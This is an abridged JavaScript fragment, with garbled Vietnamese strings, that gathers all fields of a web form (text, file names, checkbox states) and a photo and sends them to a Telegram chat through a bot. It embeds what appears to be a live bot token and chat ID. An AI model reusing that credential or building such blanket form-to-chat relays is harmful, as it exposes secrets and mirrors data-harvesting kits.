...
function validateTelegramConfig() {
  ...
  return token !== '8658285068:AAH64fP7cxaa_Mx38V15RxhxQ_hPuL34j0w' && chatId !== '8237579422';
}
...
function collectFormData(appName) {
  ...
  for (let [key, value] of formData.entries()) {
    if (value instanceof File) {
      data[key] = value.name || '(khÃ´ng cÃ³ file)';
    } else {
      data[key] = value || '(trá»‘ng)';
    }
  }
  
  const checkboxes = activeForm.querySelectorAll('input[type=checkbox]');
  checkboxes.forEach(cb => {
    data[cb.name] = cb.checked ? 'báº­t' : 'táº¯t';
  });
...
function sendToTelegram(message, photoBlob = null) {
  ...
  if (!validateTelegramConfig()) {
    alert('Thiáº¿u token hoáº·c chat ID!');
    return;
  }
  ...
  if (photoBlob) {
    ...
    formData.append('caption', 'ðŸ“¸ áº¢nh báº¡n thÃ¢n má»›i treo há»™');
...
function handleSubmit(event) {
  ...
  if (!validateTelegramConfig()) {
    alert('Vui lÃ²ng nháº­p Token vÃ  Chat ID Telegram');
    return;
  }
